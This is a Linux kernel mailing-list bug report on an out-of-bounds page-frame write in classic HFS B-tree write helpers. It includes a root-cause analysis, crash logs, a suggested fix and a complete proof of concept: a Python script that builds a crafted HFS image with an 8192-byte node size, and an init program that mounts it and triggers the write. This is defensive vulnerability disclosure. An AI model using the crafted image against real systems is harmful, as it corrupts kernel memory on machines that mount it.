Authentication-Results: smtp.subspace.kernel.org; arc=pass header.oldest-pass=0 smtp.remote-ip=209.85.210.169
ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=pass;
	t=1792659032;
	b=buKrOWpxNa2L7Ma0jDggY4VD+gMyRvAssbpjLZTBZYGGLak4H1fjKybNxtrBntcQhSJJ
	 qR6YHq/sLSUATDs99HFG+w4yJu2r1+obKO+m+S1lCO2JbydhIl3WtGyz2QaOd8biE78s5
	 4Y+CH64qfXDt0ENKBYpUIDIFa3wPzS8tnbwCz5bR1zQ5YskuYX2rwBR3I4a+LrjCf2eq9
	 vpKtv7xPafiuArFiVQIqLmKV5gPu2d0VJRowg1HY02QzHB1oBNnSf3FqiIqKexiqMSMLJ
	 zC5CXG1NmExypImOv9HRAsSFWMFXXFVck99br6A6CUT4wl7M1gUgEubH8UyeHzD8ehA==
ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792659032;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:MIME-Version:From:Date:
	 X-Gm-Features:Message-ID:Subject:To:Cc:Content-Type;
	bh=vFIIyEFKa2zjDo5iH7arY8cxWlCDf1MzByKs8g1Vuak=;
	b=jZ0xlcWIyxRbKW30R+IW1QK4M1885qpIN+i8erPY3Z8lfb9QQ+A0IH3X11C3tMVb3M53
	 9QcYNL656ZUwY6wX2auGjYPHEUUgTg1uLXeG7R4Pk6VKcrZk1R51y8IoHDSf0w4DnND+Y
	 IIrpTgDzxB4fWUMFjZ2FSxkDV1vywp1GFFklubFeg/TgDD11rc4/DBrS0fLH3LzDALwkD
	 V5JnQLdGqhYSZpgmJW5tOGTpzZbcZ5VKeQlYm+ePopSCC6+7wO5lQOtekW+7oC4O3F/od
	 h9lESzRZtCNRZ9If+55b2IjhjDEFsDT+QVAotdKy2KCt5HmxhyzcxtjewhMIq/6zDVg==
ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
	dmarc=pass header.from=gmail.com;
	spf=pass smtp.mailfrom=gmail.com;
	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b=nnKDiNqq;
	arc=pass header.oldest-pass=0 smtp.remote-ip=209.85.210.169
Received: from mail-pf1-f169.google.com (mail-pf1-f169.google.com [209.85.210.169])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2EE82606A326
	for <linux-fsdevel@vger.kernel.org>; Thu, 22 Oct 2026 08:50:32 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 2EE82606A326
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b=nnKDiNqq
Received: by mail-pf1-f169.google.com with SMTP id d2e1a72fcca58-8a06e79e152so740423b3a.0
        for <linux-fsdevel@vger.kernel.org>; Thu, 22 Oct 2026 01:50:32 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1792659031; cv=none;
        d=google.com; s=arc-20260327;
        b=QyjFTNvl3lHSQ5IBfj+FU2oat9vwyi5CWGvYY8t4ufPr6miFQ0soD0BOW21kYNiz2W
         fQ+wrGWI6AlkKjxNd2qcfIrsOtfSQBiG0gBlE7xY2Y9Zbxxmwk5QVG5HBhY1ER0TkeEX
         ldBRx3ZcKVzK0HGUbGAAB03CjSSqm4iuhvdMJZ4WmIUVkoJV+aVBVw9MJlv3AOnh62+q
         jAyDf2vP3bRFZn+WOQ+TNkyMKLfvLct1qh+NLrNgM8MG+fwJJD/QVc2GkUTTS9IRapx/
         /zaQjj8SqgsD3BhNcpO2mArkX40uI5FlmWAXKmEukfMqHmL4kuJG5imnRqIVxgwCeiSb
         xZyA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=cc:to:subject:message-id:date:from:mime-version:dkim-signature;
        bh=vFIIyEFKa2zjDo5iH7arY8cxWlCDf1MzByKs8g1Vuak=;
        fh=SsvDbR4Qx/n3P7HicBOOYEsPIrqZszmniB/arHhyzgQ=;
        b=CimCaI28daPg1kuBhu4cPO6iwFRvc3SjrrM89/OlnsPbK7VRViL152D/vgIPHrHH6T
         z+AxbbiWOdRu+qqcrscCGJ1gQUNCEv2chQLhb1zUvGNbnAN6CMu2pORdLniR7PWMgDRL
         lwOX1ljhfYZLhrRyKRSpJs93FtCVdl7BplmHf+bsqOQV2Ltp1FrSaxjQ98HqV/EBZPUh
         sIqCvKocHd0JfRSxzpC/sVTXZnsEvGXAVHnTP3So4HQtJCZ3fxJrXddqGGSzs8Ci/ZLC
         bB9er76Row/XtjBpgbtH4TR70BG0ETd3qOQkP2ZiWnwJcCru6eaZV97ZhENTkczoVwtv
         wPeg==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1792659031; x=1793263831; darn=vger.kernel.org;
        h=content-type:cc:to:subject:message-id:date:from:mime-version:from
         :to:cc:subject:date:message-id:reply-to:content-type;
        bh=vFIIyEFKa2zjDo5iH7arY8cxWlCDf1MzByKs8g1Vuak=;
        b=nnKDiNqqJm+IHowY4un+NvyYNgJDasDlbQWsdEHrMNLQsOdhd1mqGWLFiLtc0Je2rE
         gSw0d8ojn6WqNwIHwkb66aKMAjeQxz0rNb9KbvFFImuefIGT+1myWN8h3Kijq4wJPow3
         zSwdxQFq2cPQmR3WZ1BwgD3HNAUjHCTckA8J1TgP0tcN8qzdik2ZrMTmLP2THpKIWqiM
         kTeAWBXVYOBMk8RA4iMg6DBiOzR1z1App++lC4GViezhAyW+iEv4m73mXCpDllqKoHIL
         0vV5eiwunkEHiERZ9XZ26c/hVJeYCIFd4k9uz6uI+HYVG+B1D0e6fgQGe+jiG0tP4gE8
         q1eQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792659031; x=1793263831;
        h=content-type:cc:to:subject:message-id:date:from:mime-version
         :x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to:content-type;
        bh=vFIIyEFKa2zjDo5iH7arY8cxWlCDf1MzByKs8g1Vuak=;
        b=Jq3ZEUENJN7V9o474lg+dT/Eu83t8cW2pFKnw/maK7fwViDabVBJmoEGCWi3O82C8g
         ctyduu9EdiVFeo9NhDdlFCDOFXTTCcaL7/9u/p/xf1Gml0dBsIzI06YN0wYexSr30sba
         GnmezriWaIB5uQxulYeqsVFgELvwsYEzvyg3bmPZoc16XtQXjPUmQMsjUi2mUOhjhsAN
         JwjEjpJk1NGPxg++5WMUn+qrgBC/bTvhbcECOUnnTUlCuAKJBsbn3Ib3YQNfGhjOYw5F
         id3MlhjVcdofL3hYCpyvJ5MI1WTnyy7qJw81TVhyWvQgeZ2qi4gBnJXixk/5HhG70IO9
         UNpQ==
X-Gm-Message-State: AFq9FYJ6+sfKP2UKlMxV4wxmr5y+081lJFQlEkKt7Jr70f2cgrADrHga
	hEasInljNEgmWfiF9InUVwzS8xA7TCTxRi9dc5z1+WMxu+EfnwR97JPPQIpUlDaWh5gz4E2zu86
	6nH0/6xnTlyN68EznBMWlF5GHZc/p7JLoWgorByU=
X-Gm-Gg: AYBFou2KB/pvGqPNzruaQSRfwf7EmUeqwoklwDGEKJ+La9HtxKOD9ALwAcSnvx64k5m
	E3cmEs/bwM3YENyH9du/AZaAdQdaD6htPsAjYDkVFdDGv3MRr2NSdtl8YQ97Wt2RnPTp0SmeEPZ
	Z2ufGL/rB3Z4Y7GdQI08LBFLAYGSTntmG6cIxaOd/fSiTHC/+PqtltOBNZNd0PdTI+frBcMYj8t
	8BFu4rbSHhbqH4JxwKa4Y0C0A+npQRipyu3lGWSibnNPnJQmdjtk65DkMtZazrZtqTTvy7UbWJI
	0zsDyB3tIAQKfIrt5fScan2hYt93LudM96MTwBe7vO1sWRf5RzJuNGhLWUjsneq38JCU6r0De+C
	ci/R31lHAeDetBIDZqNdRE0Ice8ZEsLdRJm0e
X-Received: by 2002:a05:6a00:f89:b0:86a:c062:8af2 with SMTP id
 d2e1a72fcca58-8a089e25317mr3023008b3a.3.1792659031137; Thu, 22 Oct 2026
 01:50:31 -0700 (PDT)
X-Mailing-List: linux-fsdevel@vger.kernel.org
List-Id: <linux-fsdevel.vger.kernel.org>
List-Post: <mailto:linux-fsdevel@vger.kernel.org>
List-Help: <mailto:linux-fsdevel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-fsdevel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-fsdevel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-fsdevel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
From: pidifn voidgh <youxiangg00gle@gmail.com>
Date: Thu, 22 Oct 2026 16:50:18 +0800
X-Gm-Features: AclHuK9M2RL3GlJd2gLieWebGSl2hH8JRDeAeyk8xFMoTA2YjmW4Uh6dDRqh0Kk
Message-ID: <CAPHJXyPbhLWmuEPUUBFGdvZD6Pc8hEdVUZd6=fSxwWY4p9j=Wg@mail.gmail.com>
Subject: out-of-bounds page-frame write in B-tree node write helpers when
 node_size > PAGE_SIZE
To: linux-fsdevel@vger.kernel.org
Cc: linux-kernel@vger.kernel.org, slava@dubeyko.com
Content-Type: text/plain; charset="UTF-8"

Hello,

I'd like to report a memory-safety bug in fs/hfs (classic HFS). The four
B-tree node write helpers operate exclusively on node->page[0] while
hfs_btree_open() accepts any power-of-two node_size from the on-disk B-tree
header (8192/16384/32768 all pass). With node_size > PAGE_SIZE, the first
write of an ordinary record insert lands past the end of the page[0] frame.
I have a deterministic reproducer (mount a crafted image read-write, then
mkdir) that hits VM_BUG_ON in memcpy_to_page() with CONFIG_DEBUG_VM=y on
6.6; the same code is still present in mainline as of today.

1. SUMMARY

  fs/hfs/bnode.c write helpers -- hfs_bnode_write() (bnode.c:73),
  hfs_bnode_write_u16() (:84), hfs_bnode_clear() (:97), hfs_bnode_copy()
  (:108), hfs_bnode_move() (:125) -- issue a single memcpy_to_page()/
  memzero_page()/memcpy_page()/memmove() on node->page[0] at an offset that
  can be as large as node_size - 1.

  hfs_btree_open() (btree.c:92-97) checks only is_power_of_2(node_size);
  the value comes straight from attacker-controlled media. The rest of
  fs/hfs is multi-page aware: hfs_bnode_read() walks pages (bnode.c:18),
  hfs_bnode_create() zeroes every page (bnode.c:434-438), and
  hfs_release_folio() has an explicit node_size >= PAGE_SIZE branch. Only
  the write helpers are single-page.

  With node_size = 8192, the first write of an ordinary record insert
  (mkdir on a mounted volume) calls memcpy_to_page(page[0], 8184, ...) --
  into the page frame that physically follows page[0] in the direct map.
  The target is not node->page[1] (node pages are not required to be
  physically contiguous); it is an unrelated kernel page frame.

  With CONFIG_DEBUG_VM=y this is caught deterministically by
  VM_BUG_ON(offset + len > PAGE_SIZE) in include/linux/highmem.h:426
  (memcpy_to_page). Without CONFIG_DEBUG_VM the write lands silently;
  KASAN does not see direct-map accesses at page granularity, so this is
  invisible memory corruption of physically adjacent page frames.

2. ROOT CAUSE

  2.1 The opener places no upper bound on node_size (attacker-controlled):

      /* fs/hfs/btree.c, hfs_btree_open() */
       92:  tree->node_size = be16_to_cpu(head->node_size);
       96:  size = tree->node_size;
       97:  if (!is_power_of_2(size))   /* the ONLY check */
       ...
      121:  tree->pages_per_bnode = (tree->node_size + PAGE_SIZE - 1)
>> PAGE_SHIFT;

  2.2 The write helpers are hard-wired to page[0]:

      /* fs/hfs/bnode.c */
       73: void hfs_bnode_write(struct hfs_bnode *node, void *buf, int
off, int len)
       78:  page = node->page[0];
       80:  memcpy_to_page(page, off, buf, len);   /* off up to node_size-1 */
       97: void hfs_bnode_clear(struct hfs_bnode *node, int off, int len)
      102:  page = node->page[0];
      104:  memzero_page(page, off, len);
      108: void hfs_bnode_copy(struct hfs_bnode *dst_node, int dst, ...)
      121:  memcpy_page(dst_page, dst, src_page, src, len);
      125: void hfs_bnode_move(struct hfs_bnode *node, int dst, int
src, int len)
      135:  page = node->page[0];

      For contrast, hfs_bnode_read() at bnode.c:18 walks
      node->page[off >> PAGE_SHIFT] correctly.

      The u32 offset/length validation added by commit 00c14a09a70e
      ("hfs/hfsplus: prevent getting negative values of offset/length")
      does not close this: it clamps off/len against node_size
      (is_bnode_offset_valid(): off < node->tree->node_size), never against
      PAGE_SIZE. On today's mainline the helpers are still single-page, and
      hfs_bnode_clear(node, 0, node_size) passes every check and then
      zeroes node_size bytes starting at page[0].

  2.3 First out-of-bounds write of a plain mkdir:

      /* fs/hfs/brec.c, hfs_brec_insert() */
       94:  end_rec_off = tree->node_size - (node->num_recs + 1) * 2; /* 8186 */
       95:  end_off = hfs_bnode_read_u16(node, end_rec_off);
       96:  end_rec_off -= 2;                                       /* 8184 */
      ...
      113:  hfs_bnode_write_u16(node, offsetof(...num_recs), ...);
/* in-page */
      114:  hfs_bnode_write_u16(node, end_rec_off, end_off + size);  /* OOB */

      Line 114 asks memcpy_to_page(page[0], 8184, &data, 2) -- 4088 bytes
      past the end of the page[0] frame. No node split is required; the
      very first B-tree modification after mounting triggers it.

3. REPRODUCER (fully self-contained, unprivileged, QEMU snapshot mode)

  3.1 Kernel (tested: linux-6.6.0 from the vanilla tarball):

      tar xf linux-6.6.tar.xz && cd linux-6.6
      make defconfig
      ./scripts/config -e HFS_FS -e DEBUG_VM -e DEVTMPFS -e DEVTMPFS_MOUNT \
                        -e VIRTIO -e VIRTIO_PCI -e VIRTIO_BLK \
                        -e BLK_DEV_INITRD -e RD_GZIP -e
SERIAL_8250_CONSOLE -e PROC_FS
      make olddefconfig
      make -j"$(nproc)" bzImage

      (Host gcc >= 15 needs -std=gnu11 added to REALMODE_CFLAGS in
      arch/x86/Makefile and to KBUILD_CFLAGS in
arch/x86/boot/compressed/Makefile
      and drivers/firmware/efi/libstub/Makefile; host-toolchain issue only.)

  3.2 Crafted HFS volume: the script in APPENDIX A produces a 4 MiB minimal
      but otherwise well-formed HFS volume: MDB with drAtrb = UNMNT (the
      normal "cleanly unmounted" state, so it mounts read-write), volume
      bitmap, a catalog B-tree with nodeSize = 8192 (node 0 header + node 1
      root leaf with the root directory record and its thread record,
      free_nodes = 4 so the insert-path reservation check passes), and a
      minimal extents B-tree (nodeSize = 512, max_key_len = 7).

      SHA-256 of the generated image:
      9b666171e860e3b91ed74c7c447a09d266b5a3551fbdf38a0bc4d42e6e5db702

  3.3 Trigger: the static init in APPENDIX B mounts /dev/vda as hfs
      read-write and performs mkdir("/mnt/a", 0755).

      gcc -static -O2 -o init init.c
      echo init | cpio -o -H newc --quiet | gzip -9 > initramfs.cpio.gz

  3.4 Run (QEMU 10.1.0, TCG, no KVM needed; snapshot=on so the image is
      never written back):

      qemu-system-x86_64 -m 512 \
          -kernel arch/x86/boot/bzImage \
          -initrd initramfs.cpio.gz \
          -drive file=hfs-test.img,format=raw,if=virtio,snapshot=on \
          -append "console=ttyS0 panic_on_oops=1 panic=-1" \
          -nographic -no-reboot

4. OBSERVED RESULT

  4.1 nodeSize = 8192: BUG on the first mkdir (verbatim serial output):

      === hfs02-poc init ===
      MOUNT OK (rw)
      === TRIGGER: mkdir /mnt/a ===
      [    1.359616] kernel BUG at include/linux/highmem.h:426!
      [    1.359989] invalid opcode: 0000 [#1] PREEMPT SMP NOPTI
      [    1.360249] RIP: 0010:hfs_bnode_write_u16+0x42/0x50
      [    1.360607] RAX: 0000000000001ffa RBX: ffff978c01bacc60 RCX:
0000000000000036
      [    1.360676] RDX: 00000000000000c8 RSI: 0000000000001ff8 RDI:
ffff978c01bacc60
      [    1.361027] R15: 0000000000001ffa
      [    1.361709]  hfs_brec_insert+0x163/0x380
      [    1.361783]  hfs_cat_create+0x1ab/0x3d0
      [    1.361814]  hfs_mkdir+0x3e/0xa0
      [    1.361835]  vfs_mkdir+0x136/0x210
      [    1.361859]  do_mkdirat+0x8d/0x130
      [    1.361880]  __x64_sys_mkdir+0x47/0x70

      include/linux/highmem.h:426 is VM_BUG_ON(offset + len > PAGE_SIZE)
      inside memcpy_to_page(). RSI = 0x1ff8 = 8184 is the write offset
      handed to memcpy_to_page(), matching end_rec_off from brec.c:96 for
      node_size = 8192, num_recs = 2. The stack is the exact chain:
      mkdir -> hfs_cat_create() -> hfs_brec_insert() (brec.c:114) ->
      hfs_bnode_write_u16() -> hfs_bnode_write() ->
      memcpy_to_page(page[0], 8184, ...).

      Without CONFIG_DEBUG_VM, VM_BUG_ON compiles out and the same write
      lands silently at kmap_local_page(page[0]) + 8184 -- inside whatever
      page frame physically follows page[0] in the direct map.

  4.2 Control, nodeSize = 4096 (the ONLY change is the B-tree header
      field; offset table then lives at 4088-4094, entirely inside
      page[0]):

      === hfs02-poc init ===
      MOUNT OK (rw)
      === TRIGGER: mkdir /mnt/a ===
      MKDIR OK (no bug hit?)
      === END, powering off ===

      Mount, mkdir and poweroff all succeed. This rules out "the image is
      malformed and crashes for unrelated reasons": the identical volume
      with a page-fitting node size works end-to-end. The crash is
      specifically node_size > PAGE_SIZE x single-page write helpers.

5. IMPACT

  - OOB write magnitude: offsets up to node_size - 1 = 32767 are
    reachable, i.e. writes up to ~28 KiB past the end of the page[0]
    frame (hfs_bnode_move moves kilobyte-scale record data;
    hfs_bnode_clear(node, 0, node_size) -- reachable via the B-tree map
    path, btree.c:211 -- zeroes a full node_size).
  - Victim memory: whatever page frames follow node->page[0] in the direct
    map -- page-cache, slab, or free buddy pages; physical adjacency is
    incidental and effectively random.
  - Detectability: KASAN does not flag it; CONFIG_DEBUG_VM catches it
    deterministically; otherwise silent corruption, deferred crashes.
  - Attack surface: mounting any attacker-supplied HFS image read-write
    (loop devices, removable media, container/virt images). No privileges
    beyond the mount itself are needed.

6. SUGGESTED FIX

  Make the four write helpers page-walking, mirroring their read-side
  counterparts and the (correct, multi-page) implementations in
  fs/hfsplus/bnode.c (hfsplus_bnode_write splits the copy across
  node->page[off >> PAGE_SHIFT] with per-page
  min(len, PAGE_SIZE - (off & ~PAGE_MASK)) chunks). A Fixes: tag against
  the fs/hfs import (1da177e4c3f4, as used for the other fs/hfs security
  fixes) is appropriate.

  As defense in depth, hfs_btree_open() could additionally reject
  node_size > PAGE_SIZE, although the helper-side fix is the real fix:
  multi-page nodes are a configuration the rest of the code already
  supports.

  A quick verification for a candidate patch is the reproducer above:
  mkdir on the 8192-node image must succeed (or the mount must be
  rejected cleanly) with no VM_BUG_ON, while the 4096 control image
  keeps working.

APPENDIX A -- build_hfs_image.py

<<<
#!/usr/bin/env python3
"""
Build a minimal HFS volume that triggers the fs/hfs single-page write-helper
out-of-bounds write on kernels with CONFIG_DEBUG_VM=y.

Layout (4 MiB raw image, 512-byte disk blocks, alloc block = 512):
  disk block 2      MDB  (sig 'BD', drAtrb=UNMNT so it mounts rw)
  disk blocks 4-5   volume bitmap (fs_ablocks=8184 -> (8184+8)/8 = 1024 B)
  disk block 8+     alloc block N == disk block 8+N
    ablocks 0-95    catalog B-tree file: node_size = 8192 (the bug trigger)
      node 0        header node  (root=1, node_count=6, free_nodes=4)
      node 1        root leaf    (root dir rec + root thread rec)
      nodes 2-5     zeroed (free)
    ablock 96       extents B-tree file: node_size = 512, minimal header node
  disk block 8190   alternate MDB copy

Trigger: `mkdir <mnt>/a` -> hfs_cat_create -> hfs_brec_insert writes the
offset-table u16 at node offset 8186 -> hfs_bnode_write -> memcpy_to_page(
page[0], 8186, ..) -> VM_BUG_ON(8186+2 > PAGE_SIZE) with CONFIG_DEBUG_VM=y.

All multi-byte fields are big-endian, mirroring the __packed structs in
fs/hfs/hfs.h of the 6.6 tree this image is built against.
"""
import struct

IMG_BLOCKS = 8192          # 4 MiB / 512
ALBLK = 512                # drAlBlkSiz: 1 alloc block == 1 disk block
ALBLK_ST = 8               # drAlBlSt: ablock 0 at disk block 8
VBM_ST = 4                 # drVBMSt
FS_ABLOCKS = IMG_BLOCKS - ALBLK_ST   # 8184 = drNmAlBlks

CAT_ABLKS = 96             # catalog file: 6 nodes * 8192
CAT_NODES = 6
EXT_ABLK = 96              # extents file: 1 node * 512

HFS_NODE_HEADER = 0x01
HFS_NODE_LEAF = 0xFF
HFS_CDR_DIR = 0x01
HFS_CDR_THD = 0x03
UNMNT = 1 << 8

img = bytearray(IMG_BLOCKS * 512)


def put(off, data):
    img[off:off + len(data)] = data


def u16(off, v):
    put(off, struct.pack('>H', v))


def u32(off, v):
    put(off, struct.pack('>I', v))


# ---------- node desc (14 bytes): next, prev, type, height, num_recs, rsvd
def node_desc(off, ntype, height, num_recs):
    put(off, struct.pack('>IIBBHH', 0, 0, ntype, height, num_recs, 0))


# ---------- b-tree header record (42 bytes), written at node offset 14
def btree_header(off, depth, root, leaf_count, leaf_head, leaf_tail,
                 node_size, max_key_len, node_count, free_nodes, clump):
    # depth,root,leaf_count,leaf_head,leaf_tail,node_size,max_key_len,
    # node_count,free_nodes,reserved1 (32 B), clump_size, type,rsvd,attr
    put(off, struct.pack('>HIIIIHHIIH', depth, root, leaf_count, leaf_head,
                         leaf_tail, node_size, max_key_len, node_count,
                         free_nodes, 0))
    u32(off + 32, clump)          # clump_size
    put(off + 36, b'\x00' * 6)    # btree_type, reserved2, attributes


# ---------- catalog key on disk: (key_len|1)+1 bytes of region for empty name
def cat_key(off, parid):
    # key_len=6, reserved=0, ParID, CName.len=0, 1 pad byte
    put(off, struct.pack('>BBIB', 6, 0, parid, 0))
    put(off + 7, b'\x00')


def cat_dir(off, dirid, val):
    # struct hfs_cat_dir (70 B): type,res,Flags,Val,DirID,CrDat,MdDat,BkDat,
    # dinfo(16), dxinfo(16), Resrv[16]
    put(off, struct.pack('>BBHHIIII', HFS_CDR_DIR, 0, 0, val, dirid,
                         0, 0, 0))
    put(off + 22, b'\x00' * 48)


def cat_thread(off, parid):
    # struct hfs_cat_thread (46 B): type, reserved[9], ParID, hfs_name(32)
    put(off, struct.pack('>B9sI', HFS_CDR_THD, b'\x00' * 9, parid))
    put(off + 14, b'\x00' * 32)


def offset_table_entries(node_base, node_size, entries):
    # entries: list of record start offsets; last one is the end marker
    for i, v in enumerate(entries):
        u16(node_base + node_size - 2 * (i + 1), v)


# ================= catalog tree =================
CAT_BASE = (ALBLK_ST + 0) * 512          # disk block 8
N0 = CAT_BASE                             # node 0: header node
node_desc(N0, HFS_NODE_HEADER, 0, 3)
btree_header(N0 + 14, depth=1, root=1, leaf_count=1, leaf_head=1,
             leaf_tail=1, node_size=8192, max_key_len=37,
             node_count=CAT_NODES, free_nodes=4, clump=8192)
put(N0 + 56, b'\x00' * 4)                 # rec1: unused
put(N0 + 60, b'\x3f\x00\x00\x00')         # rec2: map, nodes 0-5 allocated
offset_table_entries(N0, 8192, [14, 56, 60, 64])

N1 = CAT_BASE + 8192                      # node 1: root leaf
node_desc(N1, HFS_NODE_LEAF, 1, 2)
cat_key(N1 + 14, 1)                       # rec0 key (ParID=1, "")
cat_dir(N1 + 22, 2, 1)                    # root dir, DirID=2, valence=1
cat_key(N1 + 92, 2)                       # rec1 key (ParID=2, "")
cat_thread(N1 + 100, 1)                   # root thread -> (ParID=1, "")
offset_table_entries(N1, 8192, [14, 92, 146])

# ================= extents tree =================
EXT_BASE = (ALBLK_ST + EXT_ABLK) * 512    # disk block 104
node_desc(EXT_BASE, HFS_NODE_HEADER, 0, 3)
btree_header(EXT_BASE + 14, depth=0, root=0, leaf_count=0, leaf_head=0,
             leaf_tail=0, node_size=512, max_key_len=7,
             node_count=1, free_nodes=0, clump=512)
put(EXT_BASE + 56, b'\x00' * 4)
put(EXT_BASE + 60, b'\x01\x00\x00\x00')   # map: node 0 allocated
offset_table_entries(EXT_BASE, 512, [14, 56, 60, 64])

# ================= volume bitmap =================
used = CAT_ABLKS + 1                      # ablocks 0..96
vm = bytearray((FS_ABLOCKS + 8) // 8)     # 1024 bytes: blocks 4-5
for i in range(used):
    vm[i >> 3] |= 1 << (i & 7)
put(VBM_ST * 512, bytes(vm))

# ================= MDB (disk block 2) =================
M = 2 * 512
put(M + 0, b'BD')                         # drSigWord
u32(M + 2, 0)                             # drCrDate
u32(M + 6, 0)                             # drLsMod
u16(M + 10, UNMNT)                        # drAtrb: cleanly unmounted -> rw
u16(M + 12, 0)                            # drNmFls
u16(M + 14, VBM_ST)                       # drVBMSt
u16(M + 16, 0)                            # drAllocPtr
u16(M + 18, FS_ABLOCKS)                   # drNmAlBlks
u32(M + 20, ALBLK)                        # drAlBlkSiz
u32(M + 24, 512)                          # drClpSiz
u16(M + 28, ALBLK_ST)                     # drAlBlSt
u32(M + 30, 17)                           # drNxtCNID
u16(M + 34, FS_ABLOCKS - used)            # drFreeBks
put(M + 36, b'hfs02poc' + b'\x00' * 20)   # drVN[28]
u32(M + 64, 0)                            # drVolBkUp
u16(M + 68, 0)                            # drVSeqNum
u32(M + 70, 0)                            # drWrCnt
u32(M + 74, 512)                          # drXTClpSiz
u32(M + 78, 8192)                         # drCTClpSiz
u16(M + 82, 1)                            # drNmRtDirs
u32(M + 84, 0)                            # drFilCnt
u32(M + 88, 1)                            # drDirCnt
put(M + 92, b'\x00' * 32)                 # drFndrInfo
u16(M + 124, 0)                           # drEmbedSigWord
u32(M + 126, 0)                           # drEmbedExtent
u32(M + 130, 512)                         # drXTFlSize
# drXTExtRec: {ablock 96, count 1}, {0,0}, {0,0}
put(M + 134, struct.pack('>HHHHHH', EXT_ABLK, 1, 0, 0, 0, 0))
u32(M + 146, CAT_ABLKS * 512)             # drCTFlSize = 49152
put(M + 150, struct.pack('>HHHHHH', 0, CAT_ABLKS, 0, 0, 0, 0))

# alternate MDB copy at the second-to-last disk block
put((IMG_BLOCKS - 2) * 512, bytes(img[M:M + 512]))

out = 'hfs-test.img'
with open(out, 'wb') as f:
    f.write(img)
print(f'wrote {out} ({len(img)} bytes)')
>>>

APPENDIX B -- init.c

<<<
/* Minimal static init for the fs/hfs single-page write-helper PoC
 * (Linux 6.6, no userspace).
 *
 * 1. mounts devtmpfs and /dev/console for stdio
 * 2. mounts the virtio disk (/dev/vda) as hfs read-write
 * 3. mkdir on the volume -> hfs_cat_create -> hfs_brec_insert -> the
 *    single-page write helper in fs/hfs/bnode.c writes past page[0]
 *    -> VM_BUG_ON in include/linux/highmem.h (CONFIG_DEBUG_VM=y)
 * 4. dumps the kernel log to the serial console
 * 5. powers off
 */
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/klog.h>
#include <sys/mount.h>
#include <sys/reboot.h>
#include <sys/stat.h>
#include <unistd.h>

static void dump_klog(void)
{
    static char buf[256 * 1024];
    int n = klogctl(3 /* SYSLOG_ACTION_READ_ALL */, buf, sizeof(buf) - 1);
    if (n <= 0) {
        printf("klogctl failed: %s\n", strerror(errno));
        return;
    }
    buf[n] = '\0';
    if (write(1, buf, n)) { /* best effort */ }
}

int main(void)
{
    int fd = open("/dev/console", O_RDWR);
    if (fd >= 0) {
        dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
        if (fd > 2) close(fd);
    }

    printf("=== hfs02-poc init ===\n");

    mkdir("/dev", 0755);
    mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);
    mkdir("/mnt", 0755);
    fd = open("/dev/console", O_RDWR);
    if (fd >= 0) {
        dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
        if (fd > 2) close(fd);
    }

    if (mount("/dev/vda", "/mnt", "hfs", 0, NULL) < 0)
        printf("MOUNT FAILED: %s\n", strerror(errno));
    else
        printf("MOUNT OK (rw)\n");

    printf("=== TRIGGER: mkdir /mnt/a ===\n");
    fflush(stdout);
    if (mkdir("/mnt/a", 0755) < 0)
        printf("MKDIR FAILED: %s\n", strerror(errno));
    else
        printf("MKDIR OK (no bug hit?)\n");
    fflush(stdout);

    sync();
    sleep(1);

    printf("=== KLOG DUMP ===\n");
    dump_klog();
    printf("=== END, powering off ===\n");
    fflush(stdout);
    sleep(1);

    reboot(RB_POWER_OFF);
    for (;;) pause();
    return 0;
}
>>>

--
Full serial-console logs of both runs are available on request.
